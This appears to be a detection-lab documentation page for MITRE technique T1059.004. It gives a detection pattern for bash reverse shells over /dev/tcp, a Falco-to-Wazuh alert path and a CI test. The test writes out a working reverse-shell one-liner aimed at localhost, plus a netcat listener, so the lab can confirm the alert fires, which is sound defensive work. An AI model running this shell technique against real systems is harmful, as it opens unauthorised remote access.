# T1059.004 — Bash reverse shell via /dev/tcp

| | |
|---|---|
| **ATT&CK** | [T1059.004](https://attack.mitre.org/techniques/T1059/004/), [T1071](https://attack.mitre.org/techniques/T1071/) |
| **Tactic** | Execution, Command And Control |
| **Severity** | high |
| **Engine** | Falco → `DLL Reverse Shell` |
| **Automated test** | ✅ attack replayed + alert asserted in CI |

## What it detects

Detects a bash process redirecting an interactive shell to a network socket using the /dev/tcp or /dev/udp pseudo-device — the classic one-liner reverse shell.

## Detection logic

```yaml
selection:
  a0|contains: /dev/tcp/
selection_cmd:
  a0: bash
  a0|contains: -i
condition: selection or selection_cmd
```

Falco (eBPF, host syscalls) raises **`DLL Reverse Shell`** from the custom rule in [`detections/falco/dll_rules.yaml`](https://github.com/MhdFadlyy/detection-lab-lite/blob/main/detections/falco/dll_rules.yaml). Falco writes its JSON events to a shared volume; the `target-linux` Wazuh agent tails that file, so the alert lands in the Wazuh indexer as a `1009xx` rule ([`0900-falco.xml`](https://github.com/MhdFadlyy/detection-lab-lite/blob/main/detections/wazuh-native/0900-falco.xml)), matched on `data.rule`.

## Attack scenario — `./lab attack T1059.004`

*Reverse shell via bash /dev/tcp*

```bash
(timeout 5 nc -l -p 9999 >/dev/null 2>&1 &) ; sleep 1 ;
timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1' || true
```

`./lab verify T1059.004` then asserts the alert reached the indexer.

## Known false positives

- Legitimate health-check scripts that probe TCP ports via /dev/tcp (rare on servers)
